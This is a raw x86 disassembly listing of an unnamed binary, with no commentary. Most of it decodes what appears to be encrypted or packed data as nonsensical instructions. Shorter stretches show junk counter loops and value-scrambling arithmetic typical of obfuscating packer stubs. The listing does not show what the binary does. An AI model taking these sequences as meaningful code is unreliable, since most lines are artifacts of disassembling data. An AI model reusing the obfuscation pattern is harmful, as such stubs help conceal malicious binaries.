  41b160:	jae    0x41b1a1
  41b162:	div    DWORD PTR [eax]
  41b164:	scas   al,BYTE PTR es:[edi]
  41b165:	xor    DWORD PTR [eax-0x25],esi
  41b168:	lea    ecx,[ebx]
  41b16a:	bound  edx,QWORD PTR [edx+0x19]
  41b16d:	push   esp
  41b16e:	jg     0x41b158
  41b170:	or     eax,0xa8fe1055
  41b175:	xor    cl,0xed
  41b178:	mov    eax,ds:0x1d2c04a0
  41b17d:	push   cs
  41b17e:	scas   eax,DWORD PTR es:[edi]
  41b17f:	fild   QWORD PTR [ebx]
  41b181:	stos   DWORD PTR es:[edi],eax
  41b182:	adc    ah,BYTE PTR [eax]
  41b184:	repnz stos BYTE PTR es:[edi],al
  41b186:	xor    edi,DWORD PTR [eax+0x20fafa96]
  41b18c:	mov    esi,0xe8fd8af7
  41b191:	cli    
  41b192:	pop    ss
  41b193:	and    eax,0x8324b5a0
  41b198:	add    al,0x99
  41b19a:	aam    0x2b
  41b19c:	push   0xffffffa8
  41b19e:	mov    BYTE PTR [edi-0x17],bl
  41b1a1:	fisttp DWORD PTR [ecx-0x6df57128]
  41b1a7:	lods   eax,DWORD PTR ds:[esi]
  41b1a8:	imul   edi,ebx,0xffffffb5
  41b1ab:	add    DWORD PTR [ecx-0x76126d91],esi
  41b1b1:	push   0xffffffc4
  41b1b3:	jle    0x41b224
  41b1b5:	mul    cl
  41b1b7:	push   esp
  41b1b8:	out    dx,eax
  41b1b9:	in     al,0xe4
  41b1bb:	jae    0x41b1eb
  41b1bd:	inc    eax
  41b1be:	clc    
  41b1bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b1c0:	adc    dl,BYTE PTR [eax-0x641fb285]
  41b1c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b1c7:	or     DWORD PTR [edi-0x7f],esi
  41b1ca:	lahf   
  41b1cb:	sub    ebp,ebp
  41b1cd:	push   es
  41b1ce:	(bad)  
  41b1cf:	pop    ss
  41b1d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b1d1:	and    al,0xe1
  41b1d3:	scas   al,BYTE PTR es:[edi]
  41b1d4:	cmp    eax,0xbadf6e20
  41b1d9:	jns    0x41b18a
  41b1db:	aad    0x6
  41b1dd:	jo     0x41b1e6
  41b1df:	xchg   edx,eax
  41b1e0:	adc    al,0x9a
  41b1e2:	xor    al,0x2f
  41b1e4:	dec    edx
  41b1e5:	xchg   edi,eax
  41b1e6:	dec    ebx
  41b1e7:	push   0xffffffd5
  41b1e9:	(bad)  
  41b1ea:	lods   eax,DWORD PTR ds:[esi]
  41b1eb:	and    BYTE PTR [edx],0xd3
  41b1ee:	push   esp
  41b1ef:	aaa    
  41b1f0:	addr16 jno 0x41b272
  41b1f3:	pop    ecx
  41b1f4:	aaa    
  41b1f5:	jp     0x41b21e
  41b1f7:	adc    bh,cl
  41b1f9:	add    eax,eax
  41b1fb:	iret   
  41b1fc:	add    al,0xcb
  41b1fe:	dec    eax
  41b1ff:	jmp    0xa40f:0x59ab5737
  41b206:	rcr    DWORD PTR [edx+0x511bea0d],0xf3
  41b20d:	mov    ah,0x7e
  41b20f:	adc    ebx,DWORD PTR [ecx]
  41b211:	mov    esi,0x7b4eef62
  41b216:	xor    dh,dh
  41b218:	clc    
  41b219:	iret   
  41b21a:	js     0x41b213
  41b21c:	mov    edx,eax
  41b21e:	outs   dx,DWORD PTR ds:[esi]
  41b21f:	lods   al,BYTE PTR ds:[esi]
  41b220:	dec    esp
  41b221:	stc    
  41b222:	add    edx,DWORD PTR [ecx]
  41b224:	mov    WORD PTR [esi],?
  41b226:	add    ecx,DWORD PTR [edx+edi*1-0x138332ea]
  41b22d:	bound  edx,QWORD PTR [edi-0x3c]
  41b230:	into   
  41b231:	add    eax,0x24c4f67d
  41b236:	xor    al,dh
  41b238:	lahf   
  41b239:	stc    
  41b23a:	sub    DWORD PTR ds:0x7c8d3121,esi
  41b240:	ror    DWORD PTR [esi+ebp*4+0x43701278],0xaf
  41b248:	retf   
  41b249:	mov    al,ds:0x11d15123
  41b24e:	push   ebp
  41b24f:	js     0x41b225
  41b251:	lock push esi
  41b253:	inc    eax
  41b254:	xchg   edx,eax
  41b255:	cld    
  41b256:	jns    0x41b1dd
  41b258:	jb     0x41b295
  41b25a:	data16 arpl WORD PTR [ecx],sp
  41b25d:	mov    dl,0xf3
  41b25f:	sub    ebp,DWORD PTR [eax-0x66]
  41b262:	inc    esp
  41b263:	jmp    0x1b1da79c
  41b268:	add    edx,edi
  41b26a:	ror    DWORD PTR [edx+ebp*2-0x20],1
  41b26e:	mov    ds:0xe1e1e0f7,eax
  41b273:	inc    ebp
  41b274:	mov    al,0xa2
  41b276:	mov    edx,0xf0aad13b
  41b27b:	cmc    
  41b27c:	pop    eax
  41b27d:	fnstsw ax
  41b27f:	dec    edx
  41b280:	fdiv   st,st(3)
  41b282:	stos   DWORD PTR es:[edi],eax
  41b283:	pop    ecx
  41b284:	push   es
  41b285:	jne    0x41b299
  41b287:	repnz mov esi,DWORD PTR [ebx]
  41b28a:	cs and eax,0x9bce932e
  41b290:	(bad)  
  41b291:	sahf   
  41b292:	xor    edx,DWORD PTR [ecx+0x578a4ae7]
  41b298:	leave  
  41b299:	pusha  
  41b29a:	lods   eax,DWORD PTR ds:[esi]
  41b29b:	xchg   esp,eax
  41b29c:	test   BYTE PTR [ecx+ebp*8-0x6a],ch
  41b2a0:	int    0x79
  41b2a2:	out    0x64,eax
  41b2a4:	(bad)  
  41b2a5:	lahf   
  41b2a6:	xchg   ebx,eax
  41b2a7:	lods   al,BYTE PTR ds:[esi]
  41b2a8:	mov    gs,WORD PTR [eax+0x29]
  41b2ab:	inc    esi
  41b2ac:	or     al,BYTE PTR [edi-0x14]
  41b2af:	lahf   
  41b2b0:	adc    edx,DWORD PTR [eax-0x30b19e21]
  41b2b6:	mov    esi,0x422570eb
  41b2bb:	stc    
  41b2bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b2bd:	jnp    0x41b264
  41b2bf:	repz sub al,0x4d
  41b2c2:	mov    ah,0xd3
  41b2c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b2c5:	push   edi
  41b2c6:	add    DWORD PTR [edx],ebp
  41b2c8:	and    DWORD PTR [eax],ecx
  41b2ca:	daa    
  41b2cb:	pop    edx
  41b2cc:	and    BYTE PTR [esi-0x42],cl
  41b2cf:	sub    edx,DWORD PTR [ebp*4-0x513f731f]
  41b2d6:	int3   
  41b2d7:	mov    esp,0x16a66e5f
  41b2dc:	cmp    al,0x98
  41b2de:	xchg   ebp,ecx
  41b2e0:	add    BYTE PTR [edx],dh
  41b2e2:	mov    bh,0xf7
  41b2e4:	mov    dh,BYTE PTR [edi+0x5c9563dd]
  41b2ea:	sbb    al,0x40
  41b2ec:	inc    esi
  41b2ed:	sub    bl,BYTE PTR [ecx]
  41b2ef:	dec    edi
  41b2f0:	push   ecx
  41b2f1:	loope  0x41b355
  41b2f3:	jg     0x41b2f2
  41b2f5:	pop    ds
  41b2f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b2f7:	sar    DWORD PTR [esi+0x1f],0x20
  41b2fb:	sub    BYTE PTR [eax+0x711a155c],dh
  41b301:	cdq    
  41b302:	add    dh,dl
  41b304:	sub    DWORD PTR [ecx+eiz*1-0x7ecd4fe8],edi
  41b30b:	mov    esi,0xde84df2c
  41b310:	das    
  41b311:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b312:	mov    ebp,0x608dfa86
  41b317:	push   0x46
  41b319:	and    bl,al
  41b31b:	jmp    0xbfb0:0x9bcb8b86
  41b322:	fisttp QWORD PTR [ecx-0x30cabfd2]
  41b328:	xchg   esp,eax
  41b329:	xchg   esp,eax
  41b32a:	jo     0x41b344
  41b32c:	ret    0x4b05
  41b32f:	add    DWORD PTR [edx+0x62],0xffffffe3
  41b333:	or     ebp,DWORD PTR [edi]
  41b335:	add    bl,BYTE PTR [edi+0x5b]
  41b338:	mov    al,0x16
  41b33a:	fbld   TBYTE PTR [ebp-0x1a]
  41b33d:	cmp    esp,edi
  41b33f:	not    DWORD PTR [edx]
  41b341:	ja     0x41b3c2
  41b343:	mov    ebp,0x6ad971e3
  41b348:	imul   edx,edx,0x65
  41b34b:	inc    edx
  41b34c:	in     al,0x4c
  41b34e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b34f:	je     0x41b2d9
  41b351:	arpl   ax,bp
  41b353:	add    ecx,DWORD PTR [edx]
  41b355:	mov    es,esi
  41b357:	jecxz  0x41b3cc
  41b359:	dec    esp
  41b35a:	jl     0x41b3cb
  41b35c:	jnp    0x41b3ca
  41b35e:	in     eax,0xcf
  41b360:	adc    al,BYTE PTR [edx+0x696e1f8d]
  41b366:	idiv   esp
  41b368:	popa   
  41b369:	mov    esp,0x3aba01dc
  41b36e:	les    ecx,FWORD PTR [edi]
  41b370:	jb     0x41b308
  41b372:	rcr    BYTE PTR [ecx+0x51],cl
  41b375:	leave  
  41b376:	js     0x41b300
  41b378:	les    edx,FWORD PTR [edx+0x64580ff7]
  41b37e:	rcr    DWORD PTR [edi],cl
  41b380:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b381:	cmp    ebp,DWORD PTR [edx+0x5e]
  41b384:	or     eax,0x6a893aa7
  41b389:	mov    WORD PTR [ebp+0x595e3f3e],cs
  41b38f:	pop    edi
  41b390:	inc    edi
  41b391:	jne    0x41b3ec
  41b393:	jo     0x41b3f1
  41b395:	test   al,0x8c
  41b397:	repnz pusha 
  41b399:	xchg   cl,bh
  41b39b:	out    0x54,eax
  41b39d:	shl    BYTE PTR [ebx-0x52782fa2],1
  41b3a3:	jo     0x41b374
  41b3a5:	push   ss
  41b3a6:	and    esp,DWORD PTR [eax+ebx*1-0x5b]
  41b3aa:	fst    DWORD PTR [ebp-0x6c]
  41b3ad:	stos   DWORD PTR es:[edi],eax
  41b3ae:	out    0xbb,eax
  41b3b0:	ins    BYTE PTR es:[edi],dx
  41b3b1:	in     al,dx
  41b3b2:	(bad)  
  41b3b3:	sti    
  41b3b4:	addr16 jbe 0x41b3e6
  41b3b7:	push   es
  41b3b8:	aaa    
  41b3b9:	test   DWORD PTR [ebp-0x46],esi
  41b3bc:	or     BYTE PTR [esi],cl
  41b3be:	cli    
  41b3bf:	aas    
  41b3c0:	loop   0x41b35c
  41b3c2:	add    al,0x28
  41b3c4:	(bad)  
  41b3c5:	es cmp eax,0xde1c46c1
  41b3cb:	xor    ebx,ebx
  41b3cd:	retf   0xf295
  41b3d0:	cmp    al,0x65
  41b3d2:	cs and esp,0xfffffff5
  41b3d6:	(bad)  
  41b3d7:	int3   
  41b3d8:	mov    bl,0x30
  41b3da:	repnz mov ds:0x5c6720b7,eax
  41b3e0:	sbb    BYTE PTR [ebx+0x4d294508],cl
  41b3e6:	pop    ecx
  41b3e7:	adc    ecx,DWORD PTR [ecx]
  41b3e9:	dec    edx
  41b3ea:	cld    
  41b3eb:	outs   dx,DWORD PTR ds:[esi]
  41b3ec:	or     al,0x4d
  41b3ee:	fnsavew [eax]
  41b3f1:	cli    
  41b3f2:	pusha  
  41b3f3:	fdiv   DWORD PTR [ebx-0x4a]
  41b3f6:	jecxz  0x41b464
  41b3f8:	and    dh,BYTE PTR [edx]
  41b3fa:	push   ecx
  41b3fb:	lds    ebx,FWORD PTR [ebx]
  41b3fd:	nop
  41b3fe:	dec    ecx
  41b3ff:	pop    ds
  41b400:	mov    al,0x77
  41b402:	xchg   edi,eax
  41b403:	cmc    
  41b404:	out    dx,eax
  41b405:	iret   
  41b406:	mov    cs:0x30e057ed,eax
  41b40c:	and    ebx,DWORD PTR [edx+eax*8+0x630f8119]
  41b413:	int    0x6f
  41b415:	js     0x41b3c0
  41b417:	xchg   edx,eax
  41b418:	sar    BYTE PTR ds:0xd19d5795,1
  41b41e:	daa    
  41b41f:	inc    esi
  41b420:	push   ds
  41b421:	loop   0x41b3ef
  41b423:	push   esi
  41b424:	inc    esp
  41b425:	daa    
  41b426:	js     0x41b40d
  41b428:	test   eax,0xc5b3db05
  41b42d:	or     eax,eax
  41b42f:	mov    ?,WORD PTR [ecx-0x56]
  41b432:	mov    al,ds:0x839adb99
  41b437:	bound  edx,QWORD PTR [esi+0x30]
  41b43a:	sbb    esi,0xe4e73dce
  41b440:	setle  bl
  41b443:	jecxz  0x41b433
  41b445:	stos   DWORD PTR es:[edi],eax
  41b446:	jmp    0x7acd:0x98b9ce25
  41b44d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b44e:	sti    
  41b44f:	cmp    dh,BYTE PTR [edx-0x1e]
  41b452:	out    dx,eax
  41b453:	pusha  
  41b454:	retf   0x19e8
  41b457:	aam    0x1c
  41b459:	test   al,0x8
  41b45b:	jnp    0x41b483
  41b45d:	rcr    DWORD PTR [edx+0x334f9929],0x48
  41b464:	and    bl,BYTE PTR [ecx-0x6acedfc7]
  41b46a:	sub    edi,DWORD PTR [edx+0x35eda07]
  41b470:	les    edi,FWORD PTR [edx]
  41b472:	fistp  QWORD PTR [edi+eiz*1-0xbe2278a]
  41b479:	mov    ds:0x38873e22,al
  41b47e:	sbb    eax,0x88f789a0
  41b483:	sbb    BYTE PTR [edi],ch
  41b485:	xchg   ebp,eax
  41b486:	mov    al,dl
  41b488:	mov    esp,0xc40816ba
  41b48d:	adc    al,0x92
  41b48f:	fnstsw WORD PTR [ebx]
  41b491:	(bad)  
  41b492:	jecxz  0x41b45b
  41b494:	test   DWORD PTR [ecx+0x42e9a18b],edx
  41b49a:	push   ss
  41b49b:	jg     0x41b51a
  41b49d:	mov    cs,WORD PTR [ebx+0x4bdf84f9]
  41b4a3:	cmp    cl,bh
  41b4a5:	jg     0x41b47f
  41b4a7:	iret   
  41b4a8:	inc    edx
  41b4a9:	enter  0x6c3c,0xd9
  41b4ad:	add    al,al
  41b4af:	cmp    al,0xe6
  41b4b1:	fnstenv [edx+0x10]
  41b4b4:	inc    ebp
  41b4b5:	jmp    0xfde1:0xe4b6660f
  41b4bc:	push   0xffffffa6
  41b4be:	pop    eax
  41b4bf:	cmp    DWORD PTR [ebx],edi
  41b4c1:	ja     0x41b4ef
  41b4c3:	xor    cl,BYTE PTR [esi+0x3a]
  41b4c6:	iret   
  41b4c7:	pop    esp
  41b4c8:	cdq    
  41b4c9:	(bad)  
  41b4ca:	lea    ecx,[ebp+0x3d]
  41b4cd:	jmp    0x41b48e
  41b4cf:	xchg   ecx,eax
  41b4d1:	push   edx
  41b4d2:	cmp    DWORD PTR [ecx+0xee128f4],edi
  41b4d8:	test   al,0x62
  41b4da:	xor    cl,BYTE PTR [eax]
  41b4dc:	sub    esi,DWORD PTR [edx+0x31]
  41b4df:	pop    eax
  41b4e0:	test   BYTE PTR [ebx],0xa8
  41b4e3:	leave  
  41b4e4:	shl    DWORD PTR [ecx-0x23],1
  41b4e7:	cmp    DWORD PTR [eax+0x1e4f131],edi
  41b4ed:	cmp    esi,DWORD PTR [eax+0x119f5f2b]
  41b4f3:	stc    
  41b4f4:	and    ebp,DWORD PTR [edi+0x32]
  41b4f7:	je     0x41b511
  41b4f9:	or     eax,DWORD PTR ds:0x9796762d
  41b4ff:	sub    eax,0x4b6c98dc
  41b504:	adc    DWORD PTR [edx+0x3a],0xc288d30f
  41b50b:	push   es
  41b50c:	mov    esi,0x6cdea693
  41b511:	pop    ebp
  41b512:	neg    al
  41b514:	ret    0x2988
  41b517:	sub    DWORD PTR [edi],ebp
  41b519:	sbb    DWORD PTR [edx-0x13fb9071],0x6f4b8ea3
  41b523:	jl     0x41b4e6
  41b525:	repz adc BYTE PTR [ebp+0x6a6b83aa],bl
  41b52c:	fwait
  41b52d:	add    BYTE PTR ds:0xab270438,0xef
  41b534:	(bad)
  41b537:	jle    0x41b563
  41b539:	add    al,0x5a
  41b53c:	xor    eax,0x3fdb4cf8
  41b541:	cli    
  41b542:	enter  0xf2ce,0x6c
  41b546:	pop    esp
  41b547:	cld    
  41b548:	aad    0x2a
  41b54a:	pushf  
  41b54b:	pop    edi
  41b54c:	mul    DWORD PTR [eax+0x2d]
  41b54f:	adc    esi,DWORD PTR [eax+0x5b]
  41b552:	arpl   cx,cx
  41b554:	push   ebp
  41b555:	mov    ecx,DWORD PTR [ebp+0x8]
  41b558:	mov    edx,DWORD PTR [ebp-0x4c]
  41b55b:	add    ecx,edi
  41b55d:	and    ecx,edx
  41b55f:	mov    DWORD PTR [ebp-0x4c],ecx
  41b562:	mov    ecx,DWORD PTR [ebp+0x8]
  41b565:	mov    edx,DWORD PTR [ebp-0x48]
  41b568:	lea    ecx,[edx+ecx*1+0x241fcdf]
  41b56f:	mov    DWORD PTR [ebp-0x48],ecx
  41b572:	mov    ecx,DWORD PTR [ebp+0x8]
  41b575:	mov    edx,0xfa5e1524
  41b57a:	sub    edx,ecx
  41b57c:	add    edx,DWORD PTR [ebp-0x44]
  41b57f:	mov    DWORD PTR [ebp-0x44],edx
  41b582:	mov    ecx,DWORD PTR [ebp+0x8]
  41b585:	xor    ecx,eax
  41b587:	add    ecx,esi
  41b589:	jne    0x4191ae
  41b58f:	jmp    0x41b621
  41b594:	mov    ecx,DWORD PTR [ebp+0x8]
  41b597:	mov    edx,DWORD PTR [ebp-0x8]
  41b59a:	xor    ecx,eax
  41b59c:	xor    edx,eax
  41b59e:	sub    ecx,edx
  41b5a0:	sub    ecx,esi
  41b5a2:	xor    ecx,eax
  41b5a4:	mov    DWORD PTR [ebp+0x8],ecx
  41b5a7:	mov    ecx,DWORD PTR [ebp+0x8]
  41b5aa:	mov    edx,DWORD PTR [ebp-0x58]
  41b5ad:	add    ecx,0x5708e2
  41b5b3:	imul   ecx,edx
  41b5b6:	mov    DWORD PTR [ebp-0x58],ecx
  41b5b9:	mov    ecx,DWORD PTR [ebp+0x8]
  41b5bc:	mov    edx,DWORD PTR [ebp-0x54]
  41b5bf:	add    ecx,0x64f880
  41b5c5:	or     ecx,edx
  41b5c7:	mov    DWORD PTR [ebp-0x54],ecx
  41b5ca:	mov    ecx,DWORD PTR [ebp+0x8]
  41b5cd:	mov    edx,DWORD PTR [ebp-0x50]
  41b5d0:	add    ecx,0x242ebf1
  41b5d6:	xor    ecx,edx
  41b5d8:	mov    DWORD PTR [ebp-0x50],ecx
  41b5db:	mov    ecx,DWORD PTR [ebp+0x8]
  41b5de:	mov    edx,DWORD PTR [ebp-0x4c]
  41b5e1:	add    ecx,edi
  41b5e3:	and    ecx,edx
  41b5e5:	mov    DWORD PTR [ebp-0x4c],ecx
  41b5e8:	mov    ecx,DWORD PTR [ebp+0x8]
  41b5eb:	mov    edx,DWORD PTR [ebp-0x48]
  41b5ee:	lea    ecx,[edx+ecx*1+0x241fcdf]
  41b5f5:	mov    DWORD PTR [ebp-0x48],ecx
  41b5f8:	mov    ecx,DWORD PTR [ebp+0x8]
  41b5fb:	mov    edx,0xfa5e1524
  41b600:	sub    edx,ecx
  41b602:	add    edx,DWORD PTR [ebp-0x44]
  41b605:	mov    DWORD PTR [ebp-0x44],edx
  41b608:	mov    ecx,DWORD PTR [ebp+0x8]
  41b60b:	xor    ecx,eax
  41b60d:	add    ecx,esi
  41b60f:	jne    0x41b594
  41b615:	mov    ecx,DWORD PTR [ebp-0x8]
  41b618:	xor    ecx,eax
  41b61a:	mov    eax,DWORD PTR [ebp+0x10]
  41b61d:	add    ecx,esi
  41b61f:	mov    DWORD PTR [eax],ecx
  41b621:	pop    edi
  41b622:	pop    esi
  41b623:	pop    ebx
  41b624:	leave  
  41b625:	ret    0xc
  41b628:	push   ebp
  41b629:	mov    ebp,esp
  41b62b:	sub    esp,0x78
  41b62e:	push   esi
  41b62f:	mov    DWORD PTR ds:0x42b21e,0x12
  41b639:	cmp    DWORD PTR ds:0x42b21e,0x0
  41b640:	je     0x41b684
  41b646:	cmp    DWORD PTR ds:0x42b21e,0x16
  41b64d:	jle    0x41b684
  41b653:	jmp    0x41b672
  41b658:	push   0x42b1fa
  41b65d:	push   0x8597
  41b662:	push   0x42a285
  41b667:	push   0x42a1b7
  41b66c:	call   DWORD PTR ds:0x42b31e
  41b672:	mov    esi,DWORD PTR ds:0x42b21e
  41b678:	dec    esi
  41b679:	mov    DWORD PTR ds:0x42b21e,esi
  41b67f:	jmp    0x41b639
  41b684:	push   edi
  41b685:	sub    DWORD PTR ds:0x42b1ca,0x4941
  41b68f:	mov    eax,ds:0x42a472
  41b694:	xor    esi,esi
  41b696:	xor    esi,DWORD PTR ds:0x42b1d6
  41b69c:	add    esi,DWORD PTR ds:0x42b1da
  41b6a2:	mov    DWORD PTR ds:0x42b1d6,esi
  41b6a8:	mov    DWORD PTR [ebp-0x24],eax
  41b6ab:	and    DWORD PTR ds:0x42b226,edx
  41b6b1:	mov    eax,ds:0x42a592
  41b6b6:	mov    ecx,DWORD PTR ds:0x42b256
  41b6bc:	mov    ecx,DWORD PTR [ecx]
  41b6be:	xor    DWORD PTR ds:0x42b1f2,ecx
  41b6c4:	mov    DWORD PTR [ebp-0x30],eax
  41b6c7:	mov    DWORD PTR ds:0x42b1b2,0x10
  41b6d1:	cmp    DWORD PTR ds:0x42b1b2,0x0
  41b6d8:	je     0x41b70e
  41b6de:	cmp    DWORD PTR ds:0x42b1b2,0x1e
  41b6e5:	ja     0x41b70e
  41b6eb:	jmp    0x41b6fb
  41b6f0:	push   0x25ea
  41b6f5:	call   DWORD PTR ds:0x42b322
  41b6fb:	xor    eax,eax
  41b6fd:	xor    eax,DWORD PTR ds:0x42b1b2
  41b703:	dec    eax
  41b704:	mov    ds:0x42b1b2,eax
  41b709:	jmp    0x41b6d1
  41b70e:	mov    DWORD PTR [ebp-0x2c],0xf89c85a5
  41b715:	and    DWORD PTR ds:0x42b21e,0x0
  41b71f:	jmp    0x41b733
  41b724:	xor    esi,esi
  41b726:	add    esi,DWORD PTR ds:0x42b21e
  41b72c:	inc    esi
  41b72d:	mov    DWORD PTR ds:0x42b21e,esi
  41b733:	cmp    DWORD PTR ds:0x42b21e,0x14
  41b73a:	jae    0x41b77c
  41b740:	cmp    DWORD PTR ds:0x42b21e,0x7
  41b747:	jl     0x41b77c
  41b74d:	jmp    0x41b75d
  41b752:	push   0x3b69
  41b757:	call   DWORD PTR ds:0x42b326
  41b75d:	cmp    DWORD PTR ds:0x42b21e,0x6
  41b764:	jne    0x41b777
  41b76a:	mov    esi,DWORD PTR ds:0x42b21e
  41b770:	inc    esi
  41b771:	mov    DWORD PTR ds:0x42b21e,esi
  41b777:	jmp    0x41b724
  41b77c:	mov    DWORD PTR [ebp-0x28],0xf89c85a2
  41b783:	or     eax,DWORD PTR ds:0x42b212
  41b789:	mov    eax,DWORD PTR [ebp-0x10]
  41b78c:	and    DWORD PTR ds:0x42b1c2,0x0
  41b796:	jmp    0x41b7aa
  41b79b:	xor    ecx,ecx
  41b79d:	or     ecx,DWORD PTR ds:0x42b1c2
  41b7a3:	inc    ecx
  41b7a4:	mov    DWORD PTR ds:0x42b1c2,ecx
  41b7aa:	cmp    DWORD PTR ds:0x42b1c2,0x16
  41b7b1:	jae    0x41b7ee
  41b7b7:	cmp    DWORD PTR ds:0x42b1c2,0x22
  41b7be:	jb     0x41b7ee
  41b7c4:	jmp    0x41b7e9
  41b7c9:	push   0x42a121
  41b7ce:	push   0x73a7
  41b7d3:	push   DWORD PTR [ebp-0x18]
  41b7d6:	push   0x5cd1
  41b7db:	push   0x2368
  41b7e0:	push   DWORD PTR [ebp-0xc]
  41b7e3:	call   DWORD PTR ds:0x42b2ea
  41b7e9:	jmp    0x41b79b
  41b7ee:	mov    ecx,DWORD PTR [ebp-0x10]
  41b7f1:	mov    DWORD PTR ds:0x42b1be,0x10
  41b7fb:	cmp    DWORD PTR ds:0x42b1be,0x0
  41b802:	je     0x41b85b
  41b808:	cmp    DWORD PTR ds:0x42b1be,0x9
  41b80f:	jle    0x41b85b
  41b815:	jmp    0x41b82f
  41b81a:	push   0x42a03d
  41b81f:	push   0x0
  41b821:	push   DWORD PTR [ebp-0xc]
  41b824:	push   0x5431
  41b829:	call   DWORD PTR ds:0x42b2ee
  41b82f:	cmp    DWORD PTR ds:0x42b1be,0xa
  41b836:	jne    0x41b849
  41b83c:	mov    edi,DWORD PTR ds:0x42b1be
  41b842:	dec    edi
  41b843:	mov    DWORD PTR ds:0x42b1be,edi
  41b849:	mov    edi,DWORD PTR ds:0x42b1be
  41b84f:	dec    edi
  41b850:	mov    DWORD PTR ds:0x42b1be,edi
  41b856:	jmp    0x41b7fb
  41b85b:	sub    eax,ecx
  41b85d:	and    esi,esi
  41b85f:	jmp    0x41dbf0
  41b864:	xchg   ch,bl
  41b866:	fdiv   st,st(3)
  41b868:	test   dl,ah
  41b86a:	xchg   BYTE PTR [edx+0x1c89e04a],dl
  41b870:	jg     0x41b87d
  41b872:	cmp    al,bl
  41b874:	out    dx,al
  41b875:	inc    DWORD PTR [eax-0x7ca1f07d]
  41b87b:	and    DWORD PTR ds:0xc518305f,0x55
  41b882:	retf   0x1f16
  41b885:	pop    edx
  41b887:	mov    ds:0x39c6b11b,eax
  41b88c:	loope  0x41b8ee
  41b88e:	or     al,0x70
  41b890:	enter  0x2b09,0x1
  41b894:	xchg   esp,eax
  41b895:	data16 adc dh,ah
  41b898:	test   al,0x1a
  41b89a:	sbb    eax,0x893fe0ae
  41b89f:	sbb    ecx,DWORD PTR [esi-0x5e8681f1]
  41b8a5:	jecxz  0x41b8a1
  41b8a7:	fld    QWORD PTR [eax+ebp*1-0x402e7fd2]
  41b8ae:	loopne 0x41b87a
  41b8b0:	pusha  
  41b8b1:	pop    edx
  41b8b2:	call   0x1c027cf3
  41b8b7:	daa    
  41b8b8:	xchg   ecx,eax
  41b8b9:	mov    dl,BYTE PTR [ebp+0x84e776a]
  41b8bf:	in     al,0xeb
  41b8c1:	mov    eax,ds:0x215ce0a3
  41b8c6:	cmp    al,0x42
  41b8c8:	jmp    0x7e44:0x1231e4c4
  41b8cf:	es xchg ebp,eax
  41b8d1:	div    eax
  41b8d3:	pop    es
  41b8d4:	repz inc esi
  41b8d6:	sub    BYTE PTR [edi+0x27],ah
  41b8d9:	or     dh,BYTE PTR [edi]
  41b8db:	jb     0x41b91d
  41b8dd:	or     al,0x91
  41b8df:	mov    dh,0xb1
  41b8e1:	jle    0x41b86b
  41b8e3:	jmp    0xd4b35e41
  41b8e8:	pusha  
  41b8e9:	add    eax,0x4ef483b5
  41b8ee:	push   cs
  41b8ef:	dec    edi
  41b8f0:	add    dh,cl
  41b8f2:	shl    BYTE PTR [edx-0x7a],cl
  41b8f5:	test   al,0x2c
  41b8f7:	ret    
  41b8f8:	and    bh,BYTE PTR [edi]
  41b8fa:	nop
  41b8fb:	ret    0xff16
  41b8fe:	pop    esp
  41b8ff:	jge    0x41b8cd
  41b901:	test   edi,ebp
  41b903:	jne    0x41b90a
  41b905:	sub    eax,0xabfc7e14
  41b90a:	(bad)  
  41b90b:	or     bl,BYTE PTR [esp+esi*4]
  41b90e:	add    al,BYTE PTR [ecx+ebx*1-0x5]
  41b912:	xchg   ebx,eax
  41b913:	dec    esp
  41b914:	pop    si
  41b916:	repnz pop esp
  41b918:	in     eax,0x13
  41b91a:	dec    ebx
  41b91b:	(bad)  
  41b91c:	ins    BYTE PTR es:[edi],dx
  41b91d:	push   esp
  41b91e:	leave  
  41b91f:	mov    ds:0x30f79d5b,al
  41b924:	ja     0x41b93d
  41b926:	and    eax,0xc170e8ac
  41b92b:	ret    0x18d2
  41b92e:	(bad)  
  41b92f:	(bad)  
  41b931:	mov    eax,ds:0x8d309df8
  41b936:	dec    edx
  41b937:	sub    eax,0x300599f6
  41b93c:	ds push ss
  41b93e:	pop    edx
  41b93f:	and    cl,dl
  41b941:	fwait
  41b942:	jle    0x41b900
  41b944:	lock push ebp
  41b946:	xchg   dh,bh
  41b948:	and    al,0xd9
  41b94a:	sub    bl,bl
  41b94c:	inc    ebp
  41b94d:	les    ebx,FWORD PTR [esi+0x74929b6d]
  41b953:	pop    ss
  41b954:	shl    DWORD PTR [esi-0x4e4d0b6f],1
  41b95a:	retf   0xcaa9
  41b95d:	inc    edi
  41b95e:	sbb    dh,0x49
  41b961:	and    bl,ch
  41b963:	jns    0x41b980
  41b965:	xor    DWORD PTR [eax-0x1f],ebp
  41b968:	aad    0x7b
  41b96a:	(bad)  
  41b96b:	sti    
  41b96c:	mov    ds:0xbecb625c,al
  41b971:	loop   0x41b915
  41b973:	mov    BYTE PTR [edx-0xc],bl
  41b976:	lods   al,BYTE PTR ds:[esi]
  41b977:	inc    edi
  41b978:	mov    edi,0x564e93fc
  41b97d:	and    dl,0x7b
  41b980:	and    dl,BYTE PTR [edi+0x44f2002c]
  41b986:	cmc    
  41b987:	mov    dh,0x93
  41b989:	push   0xffffffe6
  41b98b:	lods   eax,DWORD PTR ds:[esi]
  41b98c:	mov    esp,0xd263c25e
  41b991:	fcomi  st,st(3)
  41b993:	iret   
  41b994:	jmp    0xb2241788
  41b999:	(bad)  
  41b99a:	xor    esi,ebp
  41b99c:	xchg   ebx,eax
  41b99d:	lock inc esi
  41b99f:	rcr    eax,1
  41b9a1:	dec    esi
  41b9a2:	int3   
  41b9a3:	jge    0x41b9b9
  41b9a5:	stos   DWORD PTR es:[edi],eax
  41b9a6:	aas    
  41b9a7:	mov    esi,0xaa1ec5e3
  41b9ac:	dec    ebp
  41b9ad:	retf   0xffa8
  41b9b0:	sub    al,0x13
  41b9b2:	dec    esi
  41b9b3:	scas   al,BYTE PTR es:[edi]
  41b9b4:	ins    BYTE PTR es:[edi],dx
  41b9b5:	int3   
